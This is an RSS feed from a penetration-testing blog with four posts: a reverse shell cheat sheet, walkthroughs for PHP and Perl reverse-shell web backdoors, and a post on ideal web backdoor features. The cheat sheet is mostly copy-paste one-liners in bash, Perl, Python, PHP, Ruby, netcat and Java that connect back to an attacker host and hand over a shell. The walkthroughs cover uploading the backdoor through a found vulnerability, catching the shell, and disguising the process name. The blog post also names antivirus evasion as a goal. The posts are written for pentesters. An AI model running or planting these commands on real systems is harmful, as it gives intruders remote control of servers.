<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>reverseshell &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/reverseshell/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sun, 20 Jan 2013 00:10:15 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Reverse Shell Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 04 Sep 2011 15:50:49 +0000</pubDate>
				<category><![CDATA[Shells]]></category>
		<category><![CDATA[bash]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[netcat]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[xterm]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=175</guid>

					<description><![CDATA[If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell. If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here&#8217;s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There&#8217;s also an <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo&#8217;s Reverse Shell One-Liners</a>.  He has some alternative approaches and doesn&#8217;t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There&#8217;s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>.  Gawk is not something that I&#8217;ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>php-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/php-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/php-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 17:01:40 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=111</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-111"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz">php-reverse-shell-1.0.tar.gz</a></p>
<p>MD5sum:2bdf99cee7b302afdc45d1d51ac7e373</p>
<p>SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee</p>
<h2>Video</h2>
<p>I stumbled across this <a href="http://www.youtube.com/watch?v=A0Ks4MfhVIE">video</a> someone made of php-reverse-shell.</p>
<p><em>Update 2011-11: Imax sent me a link to his tool <a href="http://code.google.com/p/fimap/">fimap</a> which uses php-reverse-shell.  Looks cool.</em></p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:</p>
<pre>$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won&#8217;t see any output on the web page, it&#8217;ll just hang if successful):</p>
<pre>http://somesite/php-reverse-shell.php</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.  Uploading a compiled program will be of no use in these situations.  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).  Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).  Your browser will appear to hang when you access the reverse shell.  This is normal.  It&#8217;s OK to hit cancel in your browser once you&#8217;ve got your shell.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.  This version of the reverse shell isn&#8217;t very subtle:</p>
<pre>apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; /bin/sh -i
apache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 /bin/sh -i</pre>
<h3>Is this page available in Serbo-Croatian?</h3>
<p>Yes. <a href="http://science.webhostinggeeks.com/php-obrnute-ljusture">Thanks to Jovana Milutinovich for translating</a>.</p>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.  Pick a port that&#8217;s allowed through Firewall.  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.  You&#8217;ll need to modify it before it will work on windows.</p>
<p>I&#8217;ve noticed a couple of zombie processes while testing this shell.  It doesn&#8217;t always happen, but is probably to be expected since we&#8217;re not daemonising ourself properly.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/php-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>perl-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 16:44:29 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[reverseshell]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=110</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-110"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz">perl-reverse-shell-1.0.tar.gz</a></p>
<p>MD51sum: 1b38db18c1b168573afb8eeabbd8157b<br />
SHA1sum: b2dfefd3d10f5fedd674a8651e5bdcb3b3289335</p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent some else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of perl-reverse-shell.pl:</p>
<pre># Where to send the reverse shell.  Change these.</pre>
<pre>my $ip = '127.0.0.1';</pre>
<pre>my $port = 1234;</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload perl-reverse-shell.pl.  You&#8217;ll need to place it in a directory where PERL scripts can be run from (e.g. cgi-bin).  Run the script simply by browsing to the newly uploaded file in your web browser:</p>
<pre>http://somesite/cgi-bin/perl-reverse-shell.pl</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58034
 16:35:52 up 39 days, 19:30,  2 users,  load average: 0.22, 0.20, 0.14
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:07m  0.01s /bin/sh /usr/kde/3.5/bin/startk
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
uid=81(apache) gid=81(apache) groups=81(apache)
/
apache@somehost / $</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.  Uploading a compiled program will be of no use in these situations.  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PERL script?</h3>
<p>No.  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).  Additionally the PERL script attempts to daemonise itself and dissociate from the parent process to avoid this.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Kinda.  The number of processes has been minimised by using &#8220;exec&#8221; instead of &#8220;system&#8221;.  The &#8220;/bin/sh -i&#8221; process will be seen in the process listing but can be renamed.  By default /bin/sh will be renamed to /usr/sbin/apache, so the process listing looks like</p>
<pre>apache    5289  0.0  0.0   2840  1464 ?        Ss   15:31   0:00 /usr/sbin/apache -i</pre>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.  Pick a port that&#8217;s allowed through Firewall.  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.  You&#8217;ll need to modify it before it will work on windows.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>The Perfect Web Backdoor</title>
		<link>https://pentestmonkey.net/blog/perfect-web-backdoor</link>
					<comments>https://pentestmonkey.net/blog/perfect-web-backdoor#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 15:41:53 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[reverseshell]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=11</guid>

					<description><![CDATA[I&#8217;m sure most pentesters have had cause to use the likes of cmdasp.asp, or cobble together a simple PHP script based around &#8220;passthru&#8221; or &#8220;system&#8221;.  There&#8217;s loads more functionality that would be useful in such backdoors, though.  They could be made less dangerous by building in authentication, and more functional by building in database client [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I&#8217;m sure most pentesters have had cause to use the likes of cmdasp.asp, or cobble together a simple PHP script based around &#8220;passthru&#8221; or &#8220;system&#8221;.  There&#8217;s loads more functionality that would be useful in such backdoors, though.  They could be made less dangerous by building in authentication, and more functional by building in database client functionality, file browsers and reverse shells.</p>
<p>There are a couple of projects out there working on backdoor collections.  But I don&#8217;t think the quest for the perfect backdoor is over yet&#8230;</p>
<p><span id="more-11"></span><br />
David Kierznowski collected together a bunch of web backdoors a while back:<br />
<a href="http://michaeldaw.org/projects/web-backdoor-compilation/">http://michaeldaw.org/projects/web-backdoor-compilation/</a></p>
<p>These tools allow pentesters who have found a way of uploading files to web servers to more easily execute commands, explore the file system, download files, map the internal network, etc.  The idea of the web backoor compilation is that no matter what scripting languages are supported by the web server (php, perl, asp, aspx, jsp etc.), you&#8217;ve got something in your tool bag that&#8217;ll help you exploit the host more easily.</p>
<p>The compilation is very much a work in progress.  Some great feature have been suggested but not all have been implemented for each language.</p>
<p>Suggestions include:</p>
<ul>
<li>Database clients, so you script can connect databases on the internal network.</li>
<li>Authentication, so no one else can use your backdoor.</li>
<li>Self desctruct, so if someone runs your backdoor after a certain date, the backdoor is deleted.</li>
<li>Reverse shell, so you can throw back a proper interactive shell which will allow the user of interactive commands such as telnet, ssh and su.</li>
<li>File management, so you can explore the file system and upload / download files.</li>
<li>Ensuring the backdoor isn&#8217;t detected by current AV products</li>
</ul>
<p>This is a lofty goal and I hope the project is a success.  Being from a network-based pentesting background, I was most inspired by the idea of getting a reverse shell.  I&#8217;ve written working prototypes for PERL and PHP:</p>
<p><a href="http://pentestmonkey.net/tools/php-reverse-shell">http://pentestmonkey.net/tools/php-reverse-shell</a><br />
<a href="http://pentestmonkey.net/tools/perl-reverse-shell">http://pentestmonkey.net/tools/perl-reverse-shell</a></p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/perfect-web-backdoor/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
